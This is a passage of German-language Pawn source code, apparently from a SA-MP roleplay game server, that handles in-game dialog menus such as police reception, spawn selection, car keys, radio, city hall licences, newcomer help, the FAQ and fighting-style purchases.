				SendClientMessage(playerid, COLOR_YELLOW, "Einen Moment bitte, ein Officer steht dir gleich zur Verfügung");
				new sendername[MAX_PLAYER_NAME];
				new anwalt[126];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(anwalt,sizeof(anwalt),"Anwalt %s steht im Eingangsbereich und möchte zu den Zellen",sendername);
				for(new i=0; i<MAX_PLAYERS; i++)
				{
					if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(playerid, 2) || IsPlayerInFrac(playerid, 22))
					{
						SendClientMessage(i,COLOR_PURPLE,anwalt);
					}
				}
			}
			if(listitem == 1)
			{
				if(WantedLevel[playerid] < 1)
				{
					SendClientMessage(playerid, COLOR_RED, "Du bist nicht gesucht");
					return 1;
				}
				SendClientMessage(playerid, COLOR_YELLOW, "Einen Moment bitte ein Officer wird sich gleich um dich Kümmern");
                new sendername[MAX_PLAYER_NAME];
				new stellen[128];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(stellen,sizeof(stellen),"%s möchte sich stellen und steht im Eingangsbereich",sendername);
				for(new i=0; i<MAX_PLAYERS; i++)
				{
					if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(i, 2) || IsPlayerInFrac(i, 22))
					{

						SendClientMessage(i, COLOR_PURPLE, stellen);
					}
				}
			}
			if(listitem == 2)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Einen Moment bitte ein Officer steht dir gleich zur Verfügung");
				new sendername[MAX_PLAYER_NAME];
				new hilfe[128];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(hilfe,sizeof(hilfe),"%s steht im Eingangsbereich und benötigt Hilfe",sendername);
				for(new i=0; i<MAX_PLAYERS; i++)
				{
					if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(i, 2) || IsPlayerInFrac(i, 22))
					{
						SendClientMessage(i, COLOR_PURPLE, hilfe);
					}
				}
			}
		}
	}
    if(dialogid == DIALOG_ID)
    {
        if(!response)
            return 0;

        if(FloorRequestedBy[listitem] != INVALID_PLAYER_ID || IsFloorInQueue(listitem))
            GameTextForPlayer(playerid, "~r~Du bist bereits an diesem Stockwerk", 3500, 4);
		else if(DidPlayerRequestElevator(playerid))
		    GameTextForPlayer(playerid, "~r~Du hast bereits den Aufzug gerufen", 3500, 4);
		else
	        CallElevator(playerid, listitem);

		return 1;
    }
    if(dialogid == 4818)
    {
		if(response)
		{
		    if(listitem == 0)//Noobspawn
            {

			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du Spawnst nun am Noobspawn.");
			}
		    if(listitem == 1)//Fraktions
            {
	            if(PlayerInfo[playerid][sMember] != 0)
	            {
	            SpawnChange[playerid] = 0;
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du Spawnst nun bei deiner Fraktion.");
				}
			}
		    if(listitem == 2)//Haus
            {
				DialogTempIndexAmk[playerid] = 0;
				new mvstring[4024];
			    for(new i; i < MAX_HOUSE; i++)
				{
					if(HouseInfo[i][hCreated] == 1)
					{
		  		        if (strcmp(GetName(playerid), HouseInfo[i][hOwner], true) == 0)
		    		    {
								DialogTempAmk[playerid][DialogTempIndexAmk[playerid]++] = i;
								new LocationZone[MAX_ZONE_NAME];
								Get2DZone(HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey], LocationZone, MAX_ZONE_NAME);
								format(mvstring,2024,"%s\nHaus %s ID: %d",mvstring,LocationZone,i);

 					    }
					}
				}
				ShowPlayerDialog(playerid,2345,DIALOG_STYLE_LIST,"Häuser",mvstring,"Auswählen","Abbrechen");
			}
		    if(listitem == 3)//Haus
            {
				if(WohnwagenID[playerid] != 0)
				{
	                SpawnChange[playerid] = 2;
			   		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du Spawnst nun bei deinen Wohnwagen!");
		    	}
				else
	            {
			   		SendClientMessage(playerid, COLOR_GRAD2, "Du besitzt keinen Wohnwagen!");
				}
			}


	 		return 1;
		}
    }
	if(dialogid==DIALOG_CARKEYS)
	{
		if(response)
		{
			for(new mv;mv<PlayerInfo[playerid][pCarkeys];mv++)
			{
				new wstring2[145];
				new finishx2[145];
				Dtc_PlayerKey[playerid]=listitem;
				if(Dtc_PlayerHaveCar[playerid][listitem])
				{

					format(finishx2, sizeof(finishx2), "Fahrzeug: %s\nSlot %d\nFarbe: %d/%d\nKaufdatum: %d.%d.%d\nZweitschlüssel: %s\nKennzeichen: %s",CarName[PlayerCar[playerid][listitem][CarModel]-400],listitem+1,PlayerCar[playerid][listitem][CarC1],PlayerCar[playerid][listitem][CarC2],PlayerCar[playerid][listitem][CarBuyedDay],PlayerCar[playerid][listitem][CarBuyedMonth],
					PlayerCar[playerid][listitem][CarBuyedYear],PlayerCar[playerid][listitem][CarGivekey],PlayerCar[playerid][listitem][Plate]);
					ShowPlayerDialog(playerid, 4145, DIALOG_STYLE_MSGBOX, "Fahrzeug Infomationen", finishx2, "Nehmen", "Zurück");
					KeyStatus[playerid] = listitem;
					if(PlayerCar[playerid][listitem][Abgeschleppt] == 1)
					{
						SendClientMessage(playerid,blau,"Das Fahrzeug wurde abgeschleppt! Es befindet sich in der Tiefgarage vom Ordnungsamt");
						SetPlayerCheckpoint(playerid, 917.2109,-1209.8202,16.9832, 3.0);
					    Navi[playerid] = 0;
					}
					break;
				}
				else
				{
					format(wstring2, sizeof(wstring2), "Du nimmst deinen %dten Auto-Schlüssel, für deinen einen freien Platz!",listitem+1);
					SendClientMessage(playerid,blau,wstring2);
					break;
				}
			}
		}
		return 1;
	}
    if(dialogid == 4145)
    {
		if(response)
		{
			new wstring[145];
			format(wstring, sizeof(wstring), "Du nimmst deinen %dten Auto-Schlüssel, für deinen %s!",KeyStatus[playerid]+1,CarName[PlayerCar[playerid][KeyStatus[playerid]][CarModel]-400]);
			SendClientMessage(playerid,blau,wstring);
		}
		else
		{
			new mvstring[800];
			for(new mv;mv<PlayerInfo[playerid][pCarkeys];mv++)
			{
				if(Dtc_PlayerHaveCar[playerid][mv])
				{
					if(PlayerCar[playerid][mv][Abgeschleppt] == 1)
					{
						format(mvstring,800,"%s\n{FF0000}%s Abgeschleppt{FFFFFF}",mvstring,CarName[PlayerCar[playerid][mv][CarModel]-400]);
					}
					else
					{
						format(mvstring,800,"%s\n%s",mvstring,CarName[PlayerCar[playerid][mv][CarModel]-400]);
					}
				}
				else
				{
					format(mvstring,800,"%s\nFreier Slot",mvstring);
				}
			}
			ShowPlayerDialog(playerid,DIALOG_CARKEYS,DIALOG_STYLE_LIST,"Autoschlüssel",mvstring,"Auswählen","Abbrechen");
		}
		return 1;
	}
    if(dialogid == DIALOG_RADIO)
    {
		if(response)
		{
			musikan[playerid] = 0;
		    if(listitem == 0)
            {
				PlayMusic(playerid,1);
	 		}
	 		if(listitem == 1)
	 		{
				PlayMusic(playerid,2);
	 		}
	 		if(listitem == 2)
	 		{
				PlayMusic(playerid,3);
	 		}
	 		if(listitem == 3)
	 		{
				PlayMusic(playerid,4);
	 		}

	 		if(listitem == 4)
	 		{
				PlayMusic(playerid,5);
	 		}

	 		if(listitem == 5)
	 		{
				PlayMusic(playerid,6);
	 		}
	 		if(listitem == 6)
	 		{
				PlayMusic(playerid,7);
	 		}
	 		if(listitem == 7)
	 		{
				PlayMusic(playerid,8);
	 		}
	 		return 1;
		}
    }
    /*if(dialogid == DIALOG_STADTHALLE)
    {
        if(response)
        {
	        if(listitem == 0)
	        {
	            OnPlayerCommandText(playerid, "/start");
			}
			if(listitem == 1)
			{
	            OnPlayerCommandText(playerid, "/motorrad");
			}
			if(listitem == 2)
			{
				OnPlayerCommandText(playerid, "/persokaufen");
			}
		}
	}*/

	if(dialogid == DIALOG_STADTHALLE)
    {
		if(!response) return 0;
		switch(listitem)
		{
		    case 0:
		    {
		        return ShowPlayerDialog(playerid, DIALOG_iJOBS, DIALOG_STYLE_LIST, "Jobangebote", "Waffendealer\nDrogendealer\nFarmer\nDedektiv\nBusfahrer\nPilot\nZugfahrer\nAnwalt\nMüllfahrer", "Auswählen", "Abbrechen");
			}
			case 1:
		    {
				if(PlayerInfo[playerid][pJob]!=0) return SCM(playerid,-1,"Du hast bereits einen Job! Benutze /quitjob um ihn zu kündigen.");
			}
			case 2:
		    {
				new org = PlayerInfo[playerid][pOrgMember];
				if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
    			if(!strcmp(OrgInfo[org][OrgOwner], GetName(playerid), true))   //return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation Leader."); //orgowner bafrage
				{
				    ShowPlayerDialog(playerid, DIALOG_iORGLIZENZEN, DIALOG_STYLE_LIST, "ORG Lizenzen", "Mechanikerlizenz", "Auswählen", "Abbrechen");
				}
				else return SCM(playerid,-1,"Du bist nicht der Besitzer dieser Organisation.");
			}
		}
	}
	if(dialogid == DIALOG_iORGLIZENZEN)
	{
	    if(!response) return 0;
		switch(listitem)
		{
		    case 0:
		    {
		        if(IsMechatronikerLizensiert(playerid)) return SCM(playerid,-1,"Deine ORG besitzt bereits eine Mechanikerlizenz!");
		        else
		        {
          			new sstring[512];
					strcat(sstring,"Deine ORG bearbeitet Aufträge rund ums Thema Autos.\n");
					strcat(sstring,"Du kannst Autos reparieren, betanken oder abschleppen.\n");
					strcat(sstring,"Bitte lies dir vorher alle Infos im Forum durch.\n");
					strcat(sstring,"Schaltet folgende Befehle frei:\n\n");
				    strcat(sstring,"*/fixcar - Autos gegen Entgeld reparieren\n");
				    strcat(sstring,"*/fillcar - Autos gegen Entgeld betanken.\n");
				    strcat(sstring,"*/rechnung - Stelle deinem Kunden extra Kosten in Rechnung.\n");
				    strcat(sstring,"Folgende Fahrzeuge werden für deine ORG Freigeschaltet:.\n\n");
				    strcat(sstring,"* Tow-Truck\n\n");
				    strcat(sstring,"[!] Der Erwerb kostet einmalig 300.000$. Die Befehle sind für alle deiner ORG Mitglieder zugänglich.\n\n");
		            ShowPlayerDialog(playerid, DIALOG_iORGLIZENZEN+1, DIALOG_STYLE_MSGBOX, "Mechanikerlizenz", sstring, "Erwerben", "Abbrechen");
				}
			}
		}
	}

	if(dialogid == DIALOG_iORGLIZENZEN+1)
	{
	    if(GetPlayerMoneySave(playerid)< 300000) return SCM(playerid,-1,"Du kannst dir diese Lizenz nicht leisten.");
	    new org = PlayerInfo[playerid][pOrgMember];
	    OrgInfo[org][OrgMech]= 1;
	    GivePlayerMoneySave(playerid,-300000);
	    SCM(playerid,COLOR_LIGHTBLUE,"* Du hast erfolgreich eine Machanikerlizenz für deine Organisation erworben.");
	    return 1;
	}
	if(dialogid == DIALOG_NEULING)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, NEULING1, DIALOG_STYLE_MSGBOX, "Womit Kann ich Fahren?","Hallo Lieber Neuling,\nWir heißen dich nochmal Rechtherzlich bei uns Willkommen\nSo zur sache, auf der anderen Seite stehen Roller womit du fahren kannst\nMarker auf der Karte gesetzt!\nEr ist Rot Makiert.Viel Spaß!", "Fertig", "Fertig");
	            SetPlayerCheckpoint(playerid,1770.3796,-1939.0886,13.5613,8.0);
	        }
	        if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, NEULING2, DIALOG_STYLE_LIST, "Was kann ich jetzt machen?", "Führerschein\nBrauche Arbeit\nBrauche einen Personalausweiß", "Auswählen", "Abbrechen");
			}
			if(listitem == 2)
			{
				SendClientMessage(playerid, COLOR_ORANGE, "Tippe /serverinfo um mehr von uns zu erfahren!");
			}
			if(listitem == 3)
			{
			    OnPlayerCommandText(playerid, "/teamspeakip");
			}
			if(listitem == 3)
			{
				SendClientMessage(playerid, COLOR_ORANGE, "Tippe /sup um hilfe zu bekommen!");
			}
		}
	}
	if(dialogid == NEULING2)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SetPlayerCheckpoint(playerid,1481.0941,-1765.4796,18.7958,8.0);
	            SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Begebe dich zur Roten Markierung auf der Karte!");
	            SendClientMessage(playerid, COLOR_ORANGE, "Du kannst den Marker ausschalten mit /dc!");
	        }
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,2225.8604,-1157.4128,25.7804,8.0);
	            SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Begebe dich zur Roten Markierung auf der Karte!");
	            SendClientMessage(playerid, COLOR_ORANGE, "Du kannst den Marker ausschalten mit /dc!");
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,1481.0941,-1765.4796,18.7958,8.0);
	            SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Begebe dich zur Roten Markierung auf der Karte!");
	            SendClientMessage(playerid, COLOR_ORANGE, "Du kannst den Marker ausschalten mit /dc!");
			}
	    }
	}
    if(dialogid == DIALOG_HILFE)
    {
        if(response)
        {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, DIALOG_H1, DIALOG_STYLE_LIST, "{FFFFFF}Hilfreiche Befehle 1", "/stats {FF0000}(Zeigt Statistik an)\n/upgrade {FF0000}(Fähigkeiten Upgrade)\n/time {FF0000}(Aktuelle Uhrzeit)\n/buy {FF0000}(Sachen im 24/7 kaufen)\n/stake {FF0000}(Drogen / Mats aus Savebox holen)\n/put {FF0000}(Drogen / Mats in Savebox reinlegen", "Zurück", "Beenden");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, DIALOG_H2, DIALOG_STYLE_LIST, "{FFFFFF}Hilfreiche Befehle 2", "/scheine {FF0000}(Lizensen einem Spieler zeigen)\n/buygun {FF0000}(Waffen im Waffenladen kaufen)\n/skill {FF0000}(Skills anzeigen)\n/lotto {FF0000}(Lottonummer kaufen)\n/leader {FF0000}(Fraktionsleader anzeigen)\n/usedrugs {FF0000}(Drogen einnehmen)\n/service {FF0000}(Verfügbare Service anzeigen)", "Zurück", "Beenden");
			}
			if(listitem == 2)
			{
			    ShowPlayerDialog(playerid, DIALOG_H3, DIALOG_STYLE_LIST, "{FFFFFF}Hilfreiche Befehle 3", "/sup {FF0000}(Admins erreichen)\n/eject {FF0000}(Spieler aus Auto rausschmeißen)\n/serverinfo {FF0000}(Serverinformationen)\n/members {FF0000}(Eigene Frakmember online)\n/fahrlehrer {FF0000}(Fahrlehrer anzeigen)\n/mitglieder {FF0000}(Frakmember online)\n/tasche {FF0000}(Tasche ansehen)\n/dc {FF0000}(Checkpoint löschen)", "Zurück", "Beenden");
			}
			if(listitem == 3)
			{
				ShowPlayerDialog(playerid, DIALOG_H4, DIALOG_STYLE_LIST, "{FFFFFF}Hilfreiche Befehle 4", "/give {FF0000}(Gegenstände u.ä. anderen geben)\n/navi {FF0000}(GPS aufrufen)\n/s {FF0000}(Schreien}\n/w {FF0000}(Zu Spieler flüstern)\n/ad {FF0000}(Werbung schreiben)\n/call {FF0000}(Spieler anrufen)\n/atm {FF0000}(ATM Menü aufrufen, vor einem ATM)\n/bank {FF0000}Bankmenü aufrufen, in Bank)", "Zurück", "Beenden");
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pJob] == 0)
			    {
			        SendClientMessage(playerid, COLOR_GREEN, "Du brauchst einen Job um Hilfe zu bekommen!");
				}
			    if(PlayerInfo[playerid][pJob] == 1)
			    {
					ShowPlayerDialog(playerid, DIALOG_H51, DIALOG_STYLE_LIST, "{FFFFFF}Detektiv-Befehle", "/find {FF0000}(Spieler aufspüren) /showpos (Position Zeigen)", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 3)
				{
				    ShowPlayerDialog(playerid, DIALOG_H52, DIALOG_STYLE_LIST, "{FFFFFF}Zugfahrer-Befehle", "/start", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 4)
				{
					ShowPlayerDialog(playerid, DIALOG_H53, DIALOG_STYLE_LIST, "{FFFFFF}Drogendealer-Befehle", "/selldrugs {FF0000}(Drogen verkaufen)\n/get drugs {FF0000}(Drogen kaufen)", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 5)
				{
				    ShowPlayerDialog(playerid, DIALOG_H54, DIALOG_STYLE_LIST, "{FFFFFF}Carjacker-Befehle", "/caraufbrechen {FF0000}(Ein Auto aufbrechen)\n/dropcar {FF0000}(Auto abgeben)", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 8)
				{
				    ShowPlayerDialog(playerid, DIALOG_H55, DIALOG_STYLE_LIST, "{FFFFFF}Bodygurad-Befehle", "/guard", "Zurück", "Beenden");
				}
	            if(PlayerInfo[playerid][pJob] == 9)
	            {
					ShowPlayerDialog(playerid, DIALOG_H56, DIALOG_STYLE_LIST, "{FFFFFF}Waffendealer-Befehle", "/materials\n/sellgun", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 12)
				{
				    ShowPlayerDialog(playerid, DIALOG_H57, DIALOG_STYLE_LIST, "{FFFFFF}Boxer-Befehle", "/fight\n/boxstats", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 14)
				{
				    ShowPlayerDialog(playerid, DIALOG_H58, DIALOG_STYLE_LIST, "{FFFFFF}Busfahrer-Befehle", "/linie", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 15)
				{
				    ShowPlayerDialog(playerid, DIALOG_H59, DIALOG_STYLE_LIST, "{FFFFFF}Zeitungsjunge-Befehle", "/papers\n/bring\n/deliver", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 10)
				{
				    ShowPlayerDialog(playerid, DIALOG_H513, DIALOG_STYLE_LIST, "{FFFFFF}Piloten-Befehle", "/flug", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 17)
				{
				    ShowPlayerDialog(playerid, DIALOG_H510, DIALOG_STYLE_LIST, "{FFFFFF}Müllmann-Befehle", "/starten", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 18)
				{
				    ShowPlayerDialog(playerid, DIALOG_H511, DIALOG_STYLE_LIST, "{FFFFFF}Fischer-Befehle", "/fishhelp", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_H512, DIALOG_STYLE_LIST, "{FFFFFF}Pizzalieferanz-Befehle", "/sellpizza", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 6)
				{
				    ShowPlayerDialog(playerid,DIALOG_H14, DIALOG_STYLE_LIST, "{FFFFFF}Farmer-Befehle", "/ernten (im Mähdrescher an der Drogenfarm)", "Zurück", "Beenden");
				}
				if(PlayerInfo[playerid][pJob] == 2)
				{
				    SendClientMessage(playerid, COLOR_YELLOW, "=========[ANWALT]=========");
				    SendClientMessage(playerid, COLOR_ORANGE, "/free, /anwälte");
				    SendClientMessage(playerid, COLOR_ORANGE, "Mit dem Beruf Anwalt kannst du im LSPD jemanden befreien");
				    SendClientMessage(playerid, COLOR_ORANGE, "Bitte einen Polizisten dich reinzulassen und gehe zum i bei den Zellen");
				    SendClientMessage(playerid, COLOR_YELLOW, "==========================");
				}
				if(PlayerInfo[playerid][pJob] == 7)
				{
				    SendClientMessage(playerid, COLOR_YELLOW, "========[MECHANIKER]=======");
				    SendClientMessage(playerid, COLOR_ORANGE, "/repair , /refill um den Usern zu helfen");
				    SendClientMessage(playerid, COLOR_ORANGE, "Du kannst das Auto Reparieren und wieder auftanken");
				    SendClientMessage(playerid, COLOR_YELLOW, "===========================");
				}
			}
			if(listitem == 5)
			{
			    ShowPlayerFractionCommands(playerid);
				ShowPlayerDialog(playerid, DIALOG_HILFE, DIALOG_STYLE_LIST, "{FFFFFF}Die Hilfe", "Hilfreiche Befehle 1\nHilfreiche Befehle 2\nHilfreiche Befehle 3\nHilfreiche Befehle 4\nJobbefehle\nFraktionsbefehle\nSonstiges", "Auswählen", "Abbrechen");
			}
			if(listitem == 6)
			{
			    ShowPlayerDialog(playerid, DIALOG_H6, DIALOG_STYLE_LIST, "{FFFFFF}Sonstige Befehle", "/carhelp\n/telehilfe\n/househelp\n/renthelp\n/bizhelp\n/leaderhelp\n/regeln", "Zurück", "Beenden");
			}
			if(listitem == 7)
			{
				ShowPlayerDialog(playerid, DIALOG_H7, DIALOG_STYLE_MSGBOX, "{FFFFFF}Donator", "Was ist Ein Donator, Ein Donator ist eine Person die den Server Unterstützt!, Um Mehr zu erfahren Tippe /donatorhelp", "Zurück", "Beenden");
			}
			if(listitem == 8)
			{
			    ShowPlayerDialog(playerid, DIALOG_H8, DIALOG_STYLE_MSGBOX, "{FFFFFF}ServerInformationen", "Tippe /serverinfo um mehr von uns zu Erfahren!", "Zurück", "Beenden");
			}
			if(listitem == 9)
			{
			    ShowPlayerDialog(playerid, DIALOG_H9, DIALOG_STYLE_MSGBOX, "{FFFFFF}Teamspeak", "Du hast ein Problem ?\nKein Admin ist on ? Dann joine auf unseren Teamspeak\nAdresse findest du unter /teamspeakip", "Zurück", "Beenden");
			}
			if(listitem == 10)
			{
			    ShowPlayerDialog(playerid, DIALOG_H10, DIALOG_STYLE_MSGBOX, "{FFFFFF}Gangfight", "Ein Gangfight ist ein Kampf zwischen Zwei Fraktionen,\nDie sich gegenseitig beschießen und um ein Gebiet\nKämpfen\nAngriffs Befehl: /invade", "Zurück", "Beenden");
			}
			if(listitem == 11)
			{
			    new sstring[512];
				strcat(sstring,"Wie kann ich das Tutorial wiederholen?\n");
				strcat(sstring,"Wie verdiene ich schnell Geld?\n");
				strcat(sstring,"Wie komme ich in eine Fraktion?\n");
				strcat(sstring,"Wie Gründe ich eine Organisation?\n");
				strcat(sstring,"Wie kann ich ein BIZ / Haus / Tanke erwerben?\n");
				strcat(sstring,"Wie werde ich Leader?\n");
				strcat(sstring,"Das Tutorial wird mir die ganze Zeit angezeigt\n");
			    ShowPlayerDialog(playerid, DIALOG_H11, DIALOG_STYLE_LIST, "{FFFFFF}FAQ", sstring, "Fragen", "Beenden");
			}
		}
	}

	if(dialogid == DIALOG_H11)
	{
	    switch(listitem)
	    {
	        case 0:
	        {
	            return SCM(playerid,-1,"Das Tutorial kannst du unter Level 3 wiederholen indem du den Support anschreibst.");
			}
	        case 1:
	        {
	            return SCM(playerid,-1,"Wir empfehlen dazu Jobs wie Anwalt oder Busfahrer. Andernfalls kannst du in einer Fraktion bis zu 10.000€ pro PayDay verdienen.");
			}
			case 2:
	        {
	            return SCM(playerid,-1,"Du kannst die Leader entweder einfach auf dem Teamspeak ansprechen oder es Ingame per /leader > /nummer (ID) & /call oder /sms versuchen.");
			}
			case 3:
	        {
	            return SCM(playerid,-1,"In der Stadthalle über /navi. Eine ORG kannst du erst mit Level 5 & 350.000€ Gründen.");
			}
	        case 4:
	        {
         		SCM(playerid,-1,"Wenn du dich in San Andreas umschaust entdeckst du vieler dieser 'Haus Symbole'.");
         		SCM(playerid,-1,"Schaue dich um welche frei sind und kaufe Sie mit /buytanke /buyhouse oder /buybiz.");
         		return 1;
			}

	        case 5:   // hint ändern
	        {
	            return SCM(playerid,-1,"Im Forum siehst du direkt unter Leaderwerbungen welche Stellen frei sind und was du dafür benötigt.");
			}
			case 6:   // hint ändern
	        {
	            return SCM(playerid,-1,"Du kannst entweder das Tutorial machen bis zum Ende oder /startbonus eingeben, dann wirst du direkt auf Level 2 gesetzt.");
			}
		}
	}













	/*
	if(dialogid == DIALOG_H11)
	{
	    switch(listitem)
	    {
	        case 0:
	        {
	            if(GetPlayerSkin(playerid) == 0)
	            {
	                SetPlayerSkin(playerid,5);
	                SCM(playerid,-1,"Im Spielverlauf kann dies durch einen Fehler zwischendurch auftreten. Wir Entschudligungen uns für die Unannehmlichkeiten.");
	                SCM(playerid,-1,"Nach einem Relog sollte dein Skin wieder normal sen.");
				}
				else return SCM(playerid,-1,"Du hast keinen CJ Skin!");
			}
			case 1:
	        {
	            if(PlayerInfo[playerid][pJailed] == 0)
	            {
	                new string[128];
					if(PlayerInfo[playerid][pPrison] == 1)return SendClientMessage(playerid,-1,"Du bist im Prison.");
					if(PlayerInfo[playerid][pTot] == 1)return SendClientMessage(playerid,-1,"Du bist Tot.");
					if(PlayerInfo[playerid][pJailed] != 0)return SendClientMessage(playerid,-1,"Du bist im Gefängnis.");
					if(GetPlayerInterior(playerid) !=0) return SCM(playerid,-1,"Du bist in einem Interior!");
					if(GetPlayerVirtualWorld(playerid) !=0) return SCM(playerid,-1,"Du bist in einer Virtuellen Welt!");
					if(PlayerInfo[playerid][pGenerellFreezed] == 1)return SendClientMessage(playerid,-1,"Du bist manuell Gefreezed worden.");

					if(PlayerCuffed[playerid] == 1) return SendClientMessage(playerid,-1,"Du bist manuell Gefreezed worden.");

			    	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Du bist in einem Auto!");
					if(WantedLevel[playerid] >= 1) return SCM(playerid,-1,"Du wirst gesucht!");

					if(PlayerInfo[playerid][pPrisonCPs] > 0) return SCM(playerid,-1,"Nein");

					if(IstInGangFight(playerid)) return SCM(playerid,-1,"Du bist in einem Gangfight!");

					if(PlayerInfo[playerid][pHeadValue]>=1) return SCM(playerid,-1,"Du wirst gesucht!");

					format(string,sizeof(string),"Warnung: %s(%d) meldete einen Bug. 'Vom Himmel fallen' Er wurde automatisch vom System gespawnt.",GetName(playerid),playerid);
					ABroadCast(COLOR_YELLOW,string,1);

					if(WieVielAdminsOn() > 1) return SCM(playerid,-1,"Es sind mindestens 2 Admins online! Wende dich an den Support per /sup !");
					SCM(playerid,-1,"Wird überprüft...");

				}
			}
			case 0:
	        {

                new string[128];


				format(string,sizeof(string),"Warnung: %s(%d) meldete einen Freeze Bug und wurde automatisch vom System entfreezed. "Vom Himmel fallen" "),GetName(playerid),playerid);
				ABroadCast(COLOR_YELLOW,string,1);
				SCM(playerid,-1,"Eine Nachricht mit deinem Problem wurde an die Online Administratoren gesendet.");
			}

		}
	}*/
    if(dialogid == DIALOG_H1 || dialogid == DIALOG_H2 || dialogid == DIALOG_H3 || dialogid == DIALOG_H4 || dialogid == DIALOG_H6 || dialogid == DIALOG_H7 || dialogid == DIALOG_H8 || dialogid == DIALOG_H9 || dialogid == DIALOG_H10)
    {
		if(response == 1)
		{
			ShowPlayerDialog(playerid, DIALOG_HILFE, DIALOG_STYLE_LIST, "{FFFFFF}Die Hilfe", "Allgemeine Befehle 1\nAllgemeine Befehle 2\nAllgemeine Befehle 3\nAllgemeine Befehle 4\nJobbefehle\nFraktionsbefehle\nSonstiges\nDonator\nServer-Informationen\nTeamspeak\nGangfight", "Auswählen", "Abbrechen");
		}
	}

    if(dialogid == DIALOG_H51 || dialogid == DIALOG_H52 || dialogid == DIALOG_H53 || dialogid == DIALOG_H54 || dialogid == DIALOG_H55 || dialogid == DIALOG_H56 || dialogid == DIALOG_H57 || dialogid == DIALOG_H58 || dialogid == DIALOG_H59 || dialogid == DIALOG_H510 || dialogid == DIALOG_H511 || dialogid == DIALOG_H512 || dialogid == DIALOG_H513 || dialogid == DIALOG_H14)
    {
		if(response == 1)
		{
			ShowPlayerDialog(playerid, DIALOG_HILFE, DIALOG_STYLE_LIST, "{FFFFFF}Die Hilfe", "Hilfreiche Befehle 1\nHilfreiche Befehle 2\nHilfreiche Befehle 3\nHilfreiche Befehle 4\nJobbefehle\nFraktionsbefehle\nSonstiges", "Auswählen", "Abbrechen");
		}
	}

	if(dialogid == KAMPFSTYLES)
	{
		if(response)//Elbow(Level 3)\nBoxing(Level 4)\nGrabkick(Level 8)\nKneehead(Level 10)\nKungfu(Level 15)\nNormal(Level 1)
		{
			if(listitem == 0)
			{
			    if(GetPlayerMoneySave(playerid) < 5000)
			    {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
					return 1;
				}
                if(PlayerInfo[playerid][pLevel] < 3)
                {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht das benötigte Level 3");
					return 1;
				}
				GivePlayerMoneySave(playerid, -5000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_ELBOW);

				PlayerInfo[playerid][pFightingStyle] = 16;

			}
			if(listitem == 1)
			{
			    if(GetPlayerMoneySave(playerid) < 5000)
			    {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
					return 1;
				}
                if(PlayerInfo[playerid][pLevel] < 4)
                {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht das benötigte Level 4");
					return 1;
				}
			    GivePlayerMoneySave(playerid, -5000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
				PlayerInfo[playerid][pFightingStyle] = 5;

			}
			if(listitem == 2)
			{
			    if(GetPlayerMoneySave(playerid) < 5000)
			    {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
					return 1;
				}
                if(PlayerInfo[playerid][pLevel] < 8)
                {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht das benötigte Level 8");
					return 1;
				}
			    GivePlayerMoneySave(playerid, -5000);
			    SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
				PlayerInfo[playerid][pFightingStyle] = 15;
			}
			if(listitem == 3)
			{
			    if(GetPlayerMoneySave(playerid) < 5000)
			    {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
					return 1;
				}
                if(PlayerInfo[playerid][pLevel] < 10)
                {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht das benötigte Level 10");
					return 1;
				}
			    GivePlayerMoneySave(playerid, -5000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
				PlayerInfo[playerid][pFightingStyle] = 7;
			}
			if(listitem == 4)
			{
			    if(GetPlayerMoneySave(playerid) < 5000)
			    {
